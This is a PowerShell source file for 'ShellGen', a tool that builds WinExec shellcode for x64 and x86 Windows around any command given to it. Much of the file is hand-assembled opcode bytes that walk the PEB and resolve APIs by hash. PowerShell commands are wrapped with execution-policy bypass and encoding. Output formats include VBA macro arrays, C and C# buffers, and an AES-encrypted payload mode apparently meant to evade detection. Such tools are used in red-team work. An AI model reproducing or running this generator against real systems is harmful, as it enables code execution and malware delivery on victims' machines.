function ShellGen {

    <#
    	.SYNOPSIS
    	ShellGen.ps1 | Author: Rob LP (@L3o4j)
   	https://github.com/Leo4j/ShellGen
	
    	.DESCRIPTION
    	Generate ShellCode in various formats
    #>

    param (
        [string]$PwshCommand,
        [string]$B64PwshCommand,
        [string]$CmdCommand,
        [string]$Command,
	[string]$RawFile,
        [switch]$x64,
        [switch]$x86,
        [switch]$Encrypt,
        [string]$OutputFilePath,
        [string]$OutputFormat = "Raw"
    )
    
    if($RawFile){
        if(Test-Path $RawFile){
                $shellcode = [System.IO.File]::ReadAllBytes($RawFile)
        } else {
                Write-Output ""
                Write-Output "[-] Please provide a valid path to a file containing raw shellcode"
                Write-Output ""
                break
        }
    }
    else{
	    if($PwshCommand){
	        $EncCmd = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($PwshCommand))
	        $ShCommand = "powershell.exe -NoLogo -NonInteractive -ep bypass -enc $($EncCmd)"
	    }
	    
	    elseif($B64PwshCommand){
	        $ShCommand = "powershell.exe -NoLogo -NonInteractive -ep bypass -enc $($B64PwshCommand)"
	    }
	    
	    elseif($CmdCommand){
	        $ShCommand = "cmd /c $($CmdCommand)"
	    }
	
	    elseif($Command){
	        $ShCommand = $Command
	    }
	    
	    if($x64){
	        # WinExec x64 PI Null Free
	        [Byte[]] $shellcode = 0x48,0x31,0xd2        # xor rdx,rdx
	        $shellcode += 0x65,0x48,0x8b,0x42,0x60      # mov rax,qword ptr gs:[rdx+0x60]
	        $shellcode += 0x48,0x8b,0x70,0x18       # mov rsi,qword ptr [rax+0x18]
	        $shellcode += 0x48,0x8b,0x76,0x20       # mov rsi,qword ptr [rax+0x20]
	        $shellcode += 0x4c,0x8b,0x0e            # mov r9,QWORD PTR [rsi]
	        $shellcode += 0x4d,0x8b,0x09            # mov r9,QWORD PTR [r9]
	        $shellcode += 0x4d,0x8b,0x49,0x20       # mov r9,QWORD PTR [r9+0x20]
	        $shellcode += 0xeb,0x63             # jmp 0x7f
	        $shellcode += 0x41,0x8b,0x49,0x3c       # mov ecx,DWORD PTR [r9+0x3c]
	        $shellcode += 0x4d,0x31,0xff            # xor r15,r15
	        $shellcode += 0x41,0xb7,0x88            # mov r15b,0x88
	        $shellcode += 0x4d,0x01,0xcf            # add r15,r9
	        $shellcode += 0x49,0x01,0xcf            # add r15,rcx
	        $shellcode += 0x45,0x8b,0x3f            # mov r15d,dword ptr [r15]
	        $shellcode += 0x4d,0x01,0xcf            # add r15,r9
	        $shellcode += 0x41,0x8b,0x4f,0x18       # mov ecx,dword ptr [r15+0x18]
	        $shellcode += 0x45,0x8b,0x77,0x20       # mov r14d,dword ptr [r15+0x20]
	        $shellcode += 0x4d,0x01,0xce            # add r14,r9
	        $shellcode += 0xe3,0x3f             # jrcxz 0x7e
	        $shellcode += 0xff,0xc9             # dec ecx
	        $shellcode += 0x48,0x31,0xf6            # xor rsi,rsi
	        $shellcode += 0x41,0x8b,0x34,0x8e       # mov esi,DWORD PTR [r14+rcx*4]
	        $shellcode += 0x4c,0x01,0xce            # add rsi,r9
	        $shellcode += 0x48,0x31,0xc0            # xor rax,rax
	        $shellcode += 0x48,0x31,0xd2            # xor rdx,rdx
	        $shellcode += 0xfc              # cld
	        $shellcode += 0xac              # lods al,byte ptr ds:[rsi]
	        $shellcode += 0x84,0xc0             # test al,al
	        $shellcode += 0x74,0x07             # je 0x5e
	        $shellcode += 0xc1,0xca,0x0d            # ror edx,0xd
	        $shellcode += 0x01,0xc2             # add edx,eax
	        $shellcode += 0xeb,0xf4             # jmp 0x52
	        $shellcode += 0x44,0x39,0xc2            # cmp edx,r8d
	        $shellcode += 0x75,0xda             # jne 0x3d
	        $shellcode += 0x45,0x8b,0x57,0x24       # mov r10d,DWORD PTR [r15+0x24]
	        $shellcode += 0x4d,0x01,0xca            # add r10,r9
	        $shellcode += 0x41,0x0f,0xb7,0x0c,0x4a      # movzx ecx,WORD PTR [r10+rcx*2]
	        $shellcode += 0x45,0x8b,0x5f,0x1c       # mov r11d,DWORD PTR [r15+0x1c]
	        $shellcode += 0x4d,0x01,0xcb            # add r11,r9
	        $shellcode += 0x41,0x8b,0x04,0x8b       # mov eax,DWORD PTR [r11+rcx*4]
	        $shellcode += 0x4c,0x01,0xc8            # add rax,r9
	        $shellcode += 0xc3              # ret
	        $shellcode += 0xc3              # ret
	        $shellcode += 0x41,0xb8,0x83,0xb9,0xb5,0x78     # mov r8d, 0x78b5b983 TerminateProcess Hash
	        $shellcode += 0xe8,0x92,0xff,0xff,0xff      # call 0x1c
	        $shellcode += 0x48,0x89,0xc3            # mov rbx, rax
	        $shellcode += 0x41,0xb8,0x98,0xfe,0x8a,0x0e # mov r8d,0xe8afe98 WinExec Hash
	        $shellcode += 0xe8,0x84,0xff,0xff,0xff      # call 0x1c
	        $shellcode += 0x48,0x31,0xc9            # xor rcx,rcx
	         
	        $shellcode += x64Command $ShCommand
	         
	        $shellcode += 0x48,0x8d,0x0c,0x24       # lea rcx,[rsp]
	        $shellcode += 0x48,0x31,0xd2            # xor rdx,rdx
	        $shellcode += 0x48,0xff,0xc2            # inc rdx
	        $shellcode += 0x48,0x83,0xec,0x28       # sub rsp, 0x28
	        $shellcode += 0xff,0xd0             # call rax
	         
	        $shellcode += 0x48,0x31,0xc9            # xor rcx,rcx
	        $shellcode += 0x48,0xff,0xc1            # inc rcx
	        $shellcode += 0x48,0x31,0xc0            # xor rax,rax
	        $shellcode += 0x04,0x53             # add al, 0x53 exit_thread syscall val
	        $shellcode += 0x0f,0x05             # syscall
	    }
	    
	    if($x86){
	        # WinExec x86 PI Null Free
	        [Byte[]] $shellcode = 0x89,0xe5          	# mov    ebp,esp
	        $shellcode += 0x81,0xc4,0xf0,0xf9,0xff,0xff # add    esp,0xfffff9f0
	        $shellcode += 0x31,0xc9						# xor    ecx,ecx
	        $shellcode += 0x64,0x8b,0x71,0x30			# mov    esi,DWORD PTR fs:[ecx+0x30]
	        $shellcode += 0x8b,0x76,0x0c				# mov    esi,DWORD PTR [esi+0xc]
	        $shellcode += 0x8b,0x76,0x1c				# mov    esi,DWORD PTR [esi+0x1c]
	        $shellcode += 0x8b,0x5e,0x08				# mov    ebx,DWORD PTR [esi+0x8]
	        $shellcode += 0x8b,0x7e,0x20				# mov    edi,DWORD PTR [esi+0x20]
	        $shellcode += 0x8b,0x36						# mov    esi,DWORD PTR [esi]
	        $shellcode += 0x66,0x39,0x4f,0x18			# cmp    WORD PTR [edi+0x18],cx
	        $shellcode += 0x75,0xf2						# jne    0x14
	        $shellcode += 0xeb,0x06						# jmp    0x2a
	        $shellcode += 0x5e							# pop    esi
	        $shellcode += 0x89,0x75,0x04				# mov    DWORD PTR [ebp+0x4],esi
	        $shellcode += 0xeb,0x54						# jmp    0x7e
	        $shellcode += 0xe8,0xf5,0xff,0xff,0xff		# call   0x24
	        $shellcode += 0x60							# pusha
	        $shellcode += 0x8b,0x43,0x3c				# mov    eax,DWORD PTR [ebx+0x3c]
	        $shellcode += 0x8b,0x7c,0x03,0x78			# mov    edi,DWORD PTR [ebx+eax*1+0x78]
	        $shellcode += 0x01,0xdf						# add    edi,ebx
	        $shellcode += 0x8b,0x4f,0x18				# mov    ecx,DWORD PTR [edi+0x18]
	        $shellcode += 0x8b,0x47,0x20				# mov    eax,DWORD PTR [edi+0x20]
	        $shellcode += 0x01,0xd8						# add    eax,ebx
	        $shellcode += 0x89,0x45,0xfc				# mov    DWORD PTR [ebp-0x4],eax
	        $shellcode += 0xe3,0x36						# jecxz  0x7c
	        $shellcode += 0x49							# dec    ecx
	        $shellcode += 0x8b,0x45,0xfc				# mov    eax,DWORD PTR [ebp-0x4]
	        $shellcode += 0x8b,0x34,0x88				# mov    esi,DWORD PTR [eax+ecx*4]
	        $shellcode += 0x01,0xde						# add    esi,ebx
	        $shellcode += 0x31,0xc0						# xor    eax,eax
	        $shellcode += 0x99							# cdq
	        $shellcode += 0xfc							# cld
	        $shellcode += 0xac							# lods   al,BYTE PTR ds:[esi]
	        $shellcode += 0x84,0xc0						# test   al,al
	        $shellcode += 0x74,0x07						# je     0x5f
	        $shellcode += 0xc1,0xca,0x0d				# ror    edx,0xd
	        $shellcode += 0x01,0xc2						# add    edx,eax
	        $shellcode += 0xeb,0xf4						# jmp    0x53
	        $shellcode += 0x3b,0x54,0x24,0x24			# cmp    edx,DWORD PTR [esp+0x24]
	        $shellcode += 0x75,0xdf						# jne    0x44
	        $shellcode += 0x8b,0x57,0x24				# mov    edx,DWORD PTR [edi+0x24]
	        $shellcode += 0x01,0xda						# add    edx,ebx
	        $shellcode += 0x66,0x8b,0x0c,0x4a			# mov    cx,WORD PTR [edx+ecx*2]
	        $shellcode += 0x8b,0x57,0x1c				# mov    edx,DWORD PTR [edi+0x1c]
	        $shellcode += 0x01,0xda						# add    edx,ebx
	        $shellcode += 0x8b,0x04,0x8a				# mov    eax,DWORD PTR [edx+ecx*4]
	        $shellcode += 0x01,0xd8						# add    eax,ebx
	        $shellcode += 0x89,0x44,0x24,0x1c			# mov    DWORD PTR [esp+0x1c],eax
	        $shellcode += 0x61							# popa
	        $shellcode += 0xc3							# ret
	        $shellcode += 0x68,0x83,0xb9,0xb5,0x78		# push   0x78b5b983
	        $shellcode += 0xff,0x55,0x04				# call   DWORD PTR [ebp+0x4]
	        $shellcode += 0x89,0x45,0x10				# mov    DWORD PTR [ebp+0x10],eax
	        $shellcode += 0x68,0x98,0xfe,0x8a,0x0e		# push   0xe8afe98
	        $shellcode += 0xff,0x55,0x04				# call   DWORD PTR [ebp+0x4]
	        $shellcode += 0x89,0x45,0x14				# mov    DWORD PTR [ebp+0x14],eax
	        $shellcode += 0x31,0xc0						# xor    eax,eax
	        $shellcode += 0x50							# push   eax
	
	        $shellcode += x86Command $ShCommand
	
	        $shellcode += 0x89,0xe3						# mov    ebx,esp
	        $shellcode += 0x50							# push   eax
	        $shellcode += 0x53							# push   ebx
	        $shellcode += 0xff,0x55,0x14				# call   DWORD PTR [ebp+0x14]
	        $shellcode += 0x31,0xc9						# xor    ecx,ecx
	        $shellcode += 0x51							# push   ecx
	        $shellcode += 0x6a,0xff						# push   0xffffffff
	        $shellcode += 0xff,0x55,0x10				# call   DWORD PTR [ebp+0x10]
	    }
    }
	
    $payloadSize = $shellcode.Length
    
    switch ($OutputFormat) {
        "Encrypted" {
            $keyString = -join ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
			$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($keyString)
			$encryptedData = AESEncrypt -plainText $shellcode -Key $keyBytes
			$formattedOutput = Format-ByteArray -byteArray $encryptedData
			$formattedKey = Format-ByteArray -byteArray $keyBytes
			Write-Output "AESkey[] = {$formattedKey}"
			Write-Output "payload[] = {$formattedOutput}"
			Write-Output ""
        }
		"Raw" {
            if (-not $OutputFilePath) {
                $OutputFilePath = ".\payload.raw"
            }
            Set-Content -Path $OutputFilePath -Value $shellcode -Encoding Byte
            $finalSize = (Get-Item $OutputFilePath).length
            Write-Output "Payload size: $payloadSize bytes"
            Write-Output "Final size of raw file: $finalSize bytes"
			Write-Output "[*] Payload saved to $OutputFilePath"
			Write-Output ""
        }
        "ps1" {
            $ps1Content = "[Byte[]] `$buf = $(($shellcode | ForEach-Object { `"0x{0:X2}`" -f $_ }) -join ',')"

            if ($OutputFilePath) {
                Set-Content -Path $OutputFilePath -Value $ps1Content
                $finalSize = (Get-Item $OutputFilePath).length
                Write-Output "Payload size: $payloadSize bytes"
                Write-Output "Final size of ps1 file: $finalSize bytes"
				Write-Output "[*] Payload saved to $OutputFilePath"
            }
			else{
				Write-Output "Payload size: $payloadSize bytes"
				Write-Output $ps1Content
			}
			Write-Output ""
        }
        "Hex" {
            $hexContent = "$($shellcode | foreach-object { "$($_.ToString("X2"))" })"
            $hexContent = $hexContent.replace(' ', '')
            Write-Output "Payload size: $payloadSize bytes"
            Write-Output "Final size of Hex string: $($hexContent.Length) characters"
            Write-Output $hexContent
			Write-Output ""
        }
        "C" {
            $formattedShellcode = $shellcode | ForEach-Object { '\x' + $_.ToString('X2') }
			$lines = @()
			for ($i = 0; $i -lt $formattedShellcode.Length; $i += 15) {
				$line = $formattedShellcode[$i..[Math]::Min($i+14, $formattedShellcode.Length-1)] -join ''
				$lines += "`"$line`""
			}
			$cContent = "unsigned char buf[] =`n" + ($lines -join "`n") + ";"
            if ($OutputFilePath) {
                Set-Content -Path $OutputFilePath -Value $cContent
                $finalSize = (Get-Item $OutputFilePath).length
                Write-Output "Payload size: $payloadSize bytes"
                Write-Output "Final size of C file: $finalSize bytes"
            }
			else{
				Write-Output "Payload size: $payloadSize bytes"
			}
            Write-Output $cContent
			Write-Output ""
        }
        "vba" {
		$chunkSize = 100
		$shellcodeChunks = @()

		# Initialize the first chunk to avoid repetition
		$vbaContent = "buf = Array(" + ($shellcode[0..([Math]::Min($chunkSize - 1, $shellcode.Length - 1))] -join ',') + ")" + "`n"

		# Loop through the rest of the shellcode starting from the second chunk
		for ($i = $chunkSize; $i -lt $shellcode.Length; $i += $chunkSize) {
			$chunk = $shellcode[$i..([Math]::Min($i + $chunkSize - 1, $shellcode.Length - 1))]
			$shellcodeChunks += "buf = Concatenate(buf, Array(" + ($chunk -join ',') + "))"
		}

		# Combine all chunks into VBA content
		$vbaContent += ($shellcodeChunks -join "`n")

		# Output or save to file
		if ($OutputFilePath) {
			Set-Content -Path $OutputFilePath -Value $vbaContent
			$finalSize = (Get-Item $OutputFilePath).length
			Write-Output ""
			Write-Output "Payload size: $payloadSize bytes"
			Write-Output ""
			Write-Output "Final size of vbapplication file: $finalSize bytes"
			Write-Output "[*] Payload saved to $OutputFilePath"
		} else {
			Write-Output ""
			Write-Output "Payload size: $payloadSize bytes"
			Write-Output ""
			Write-Output $vbaContent
		}
		Write-Output ""
		Write-Output "!! Add the following function to your VBA script !!"
		Write-Output ""
		Write-Output @'
Function Concatenate(arr1 As Variant, arr2 As Variant) As Variant
    Dim result() As Variant
    Dim i As Long, j As Long, k As Long

    ' Resize the result array to fit both arrays
    ReDim result(LBound(arr1) To UBound(arr1) + UBound(arr2) - LBound(arr2) + 1)

    ' Copy first array to result
    For i = LBound(arr1) To UBound(arr1)
        result(i) = arr1(i)
    Next i

    ' Copy second array to result
    k = i ' Start index for the second array in the result
    For j = LBound(arr2) To UBound(arr2)
        result(k) = arr2(j)
        k = k + 1
    Next j

    Concatenate = result
End Function
'@
		Write-Output ""
	}
        "csharp" {
            $formattedShellcode = $shellcode | ForEach-Object { '0x' + $_.ToString('X2') }
            $lines = @()
            for ($i = 0; $i -lt $formattedShellcode.Length; $i += 15) {
                $line = $formattedShellcode[$i..[Math]::Min($i+14, $formattedShellcode.Length-1)] -join ','
                $lines += $line
            }
            $csharpContent = "byte[] buf = new byte[$payloadSize] {`n" + ($lines -join ",`n") + "};"
            if ($OutputFilePath) {
                Set-Content -Path $OutputFilePath -Value $csharpContent
                $finalSize = (Get-Item $OutputFilePath).length
                Write-Output "Payload size: $payloadSize bytes"
                Write-Output "Final size of csharp file: $finalSize bytes"
                Write-Output "[*] Payload saved to $OutputFilePath"
            }
            else {
                Write-Output "Payload size: $payloadSize bytes"
                Write-Output $csharpContent
            }
            Write-Output ""
        }
    }
}

function x64Reverse ([array] $chunks) {
    $arr = $chunks | ForEach-Object { $_ }
    [array]::Reverse($arr)
    return $arr
}

function x86Reverse ([array] $chunks) {
    $arr = $chunks | ForEach-Object { $_ }
    [array]::Reverse($arr)
    return $arr
}
 
function x64Encode-Command {
    param (
        [string]$command
    )
    while ($command.Length -lt 7) {
        $command = $command + " "
    }
 
    $result = [System.Text.Encoding]::UTF8.GetBytes($command)
    $result = $result | ForEach-Object { -bnot ($_ -band 0xFF) -band 0xFF }
    if ($command.Length -lt 8) {
        $result += 0xff
    }
    return $result
 
}

function x86Encode-Command {
    param (
        [string]$command
    )
    while ($command.Length -lt 3) {
        $command = $command + " "
    }
 
    $result = [System.Text.Encoding]::UTF8.GetBytes($command)
    if ($command.Length -lt 4) {
        $result += 0x20
    }
    return $result
 
}
 
function x64Command ([string] $command) {
    $size = 8
    $chunks = @(for ($i = 0; $i -lt $command.Length; $i += $size) { $command.Substring($i, [Math]::Min($size, $command.Length - $i)) })
    $output = @()
    if ($chunks.Count -gt 1) {
        $chunks = x64Reverse($chunks)
    } else {
        $output += 0x48,0xb9,0xdf,0xdf,0xdf,0xdf,0xdf,0xdf,0xdf,0xff,0x48,0xf7,0xd1,0x51
    }
    foreach ($chunk in $chunks) {
        $output += 0x48,0xb9
    $output += x64Encode-Command $chunk
        $output += 0x48,0xf7,0xd1
        $output += 0x51
    }
    return $output
}
 
function x86Command ([string] $command) {
    $size = 4
    $chunks = @(for ($i = 0; $i -lt $command.Length; $i += $size) { $command.Substring($i, [Math]::Min($size, $command.Length - $i)) })
    $output = @()
    if ($chunks.Count -gt 1) {
        $chunks = x86Reverse($chunks)
    } 
    foreach ($chunk in $chunks) {
        $output += 0x68
    	$output += x86Encode-Command $chunk
    }
    return $output
}

function AESEncrypt {
    param (
        [byte[]]$plainText,  # The data to be encrypted
        [byte[]]$Key         # The cleartext key
    )

    if ($Key.Length -ne 16 -and $Key.Length -ne 24 -and $Key.Length -ne 32) {
        throw "Invalid key size. AES supports keys of 128, 192, or 256 bits."
    }

    $aesAlg = [System.Security.Cryptography.Aes]::Create()
    $aesAlg.Key = [System.Security.Cryptography.SHA256]::Create().ComputeHash($Key) # Hash the key to match Python scripts if needed
    $aesAlg.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesAlg.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesAlg.IV = [byte[]](0..15 | ForEach-Object { 0 })  # Fixed IV of 16 null bytes

    $encryptor = $aesAlg.CreateEncryptor($aesAlg.Key, $aesAlg.IV)
    return $encryptor.TransformFinalBlock($plainText, 0, $plainText.Length)
}

function Format-ByteArray {
    param (
        [byte[]]$byteArray
    )

    $formattedBytes = $byteArray | ForEach-Object { "0x{0:x2}" -f $_ }
    return ($formattedBytes -join ", ")
}
